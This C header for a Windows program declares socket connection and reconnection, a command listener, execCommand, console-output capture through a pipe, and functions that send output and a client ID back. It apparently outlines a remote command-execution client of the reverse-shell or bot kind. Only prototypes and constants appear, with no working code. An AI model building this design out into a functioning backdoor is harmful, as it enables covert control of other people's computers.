#ifndef ADDITION_H
#define ADDITION_H

#define SIZE_PIECE_OUTPUT 100
#define LOOP_TIME_WAIT 1
#define RECONNECTION_TIME_WAIT 100
#define ID_FILE_NAME "id.txt"

#include <stdio.h>
#include <windows.h>

#endif // ADDITION_H

extern HANDLE hReadPipe1;

//-----------------mySTL-------------------//
#define STRLEN
#define STRCMP_1
#define STRCPY_1
#define STRCAT_1
#define ADD_CHAR
#define ADD_STR
#define EXTRACT_MSG
#define ITOA
#define REVERSE
#include "mySTL.h"
//-----------------/mySTL------------------//

//----------------initialization-----------//
sockaddr_in *initPreConnection();
SOCKET *initConnection(sockaddr_in *addr);
//----------------/initialization----------//


//-----------------listener----------------//
char listenData(void *sock);
//-----------------/listener----------------//


//-----------------performer----------------//
int execCommand(char *command);
char *readFromFile(char *fileName);
void writeToFile(char *fileName, char *str);
void closeHandles(HANDLE a1, HANDLE a2, HANDLE a3, HANDLE a4);
//-----------------/performer----------------//


//-----------------sender----------------//
void sendConsoleOutput(SOCKET *sock, char * output, char *id);
char *readConsoleOutput(HANDLE hReadPipe);
void sendRequest(SOCKET *sock, char *id);
//-----------------/sender----------------//

